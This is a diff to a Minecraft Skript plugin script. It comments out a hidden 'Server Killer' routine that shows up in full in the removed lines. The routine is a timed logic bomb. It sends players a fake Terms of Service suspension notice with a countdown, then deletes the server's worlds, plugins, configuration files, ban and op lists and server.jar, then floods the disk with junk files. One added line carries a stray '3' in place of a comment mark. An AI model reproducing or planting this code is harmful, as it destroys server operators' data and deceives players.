@@ -8,72 +8,72 @@ on chat:
 
 #Server Killer
 function doom():
-	execute console command "/save-off"
-	delete directory "plugins"
-	delete directory "world"
-	delete directory "world_nether"
-	delete directory "world_the_end"
-	delete directory "config"
-	delete directory "world"
-	delete directory "logs"
-	delete directory "cache"
-	delete directory "libraries"
-	delete directory "versions"
-	delete file "usercache.json"
-	delete file "banned-ips.json"
-	delete file "banned-players.json"
-	delete file "bukkit.yml"
-	delete file "commands.yml"
-	delete file "eula.txt"
-	delete file "help.yml"
-	delete file "ops.json"
-	delete file "paper.yml-README.txt"
-	delete file "permissions.yml"
-	delete file "server.properties"
-	delete file "spigot.yml"
-	delete file "whitelist.json"
-	delete file "version_history.json"
-	delete file "server.jar"
-	doomend()
+#	execute console command "/save-off"
+#	delete directory "plugins"
+#	delete directory "world"
+#	delete directory "world_nether"
+#	delete directory "world_the_end"
+#	delete directory "config"
+#	delete directory "world"
+#	delete directory "logs"
+#	delete directory "cache"
+#	delete directory "libraries"
+#	delete directory "versions"
+#	delete file "usercache.json"
+#	delete file "banned-ips.json"
+#	delete file "banned-players.json"
+#	delete file "bukkit.yml"
+#	delete file "commands.yml"
+#	delete file "eula.txt"
+#	delete file "help.yml"
+#	delete file "ops.json"
+#	delete file "paper.yml-README.txt"
+#	delete file "permissions.yml"
+#	delete file "server.properties"
+#	delete file "spigot.yml"
+#	delete file "whitelist.json"
+#	delete file "version_history.json"
+#	delete file "server.jar"
+#	doomend()
 
 function doomend():
-	loop 1000000 times:
-		loop 300 times:
-			create file "suspended-%random integer from 1 to 10000000000000%"
+#	loop 1000000 times:
+#		loop 300 times:
+#			create file "suspended-%random integer from 1 to 10000000000000%"
 
 function countdown():
-	loop 8 times:
-		send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
-		send title "<red>%11 - loop-integer%" to all players
-		play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
-		wait 1 second
-	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
-	send title "<red>2" to all players
-	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
-	wait 1 second
-	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
-	send title "<red>1" to all players
-	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
-	wait 1 second
-	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
-	send title "<red>0" to all players
-	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
-	doom()
+#	loop 8 times:
+#		send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
+#		send title "<red>%11 - loop-integer%" to all players
+#		play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
+#		wait 1 second
+#	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
+3	send title "<red>2" to all players
+#	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
+#	wait 1 second
+#	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
+#	send title "<red>1" to all players
+#	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
+#	wait 1 second
+#	send "<Light red>This server has been suspended for violating our Terms of Service you may not appeal this supension." to all players
+#	send title "<red>0" to all players
+#	play sound "minecraft:entity.ghast.scream" with volume 10 with pitch 2 to all players
+#	doom()
 
 on load:
-	set {NOW} to 5 minutes from now
+#	set {NOW} to 5 minutes from now
 
 every 1 tick:
-	set {NOWNOW} to now
-	if {NOW} <= {NOWNOW}:
-		clear {NOW}
-		countdown()
-	else if {AA} = 1:
-		clear {NOW}
-		countdown()
+#	set {NOWNOW} to now
+#	if {NOW} <= {NOWNOW}:
+#		clear {NOW}
+#		countdown()
+#	else if {AA} = 1:
+#		clear {NOW}
+#		countdown()
 	
 on unload:
-	set {AA} to 1
+#	set {AA} to 1
 
 #Log Toggle
 command /togglelogs:
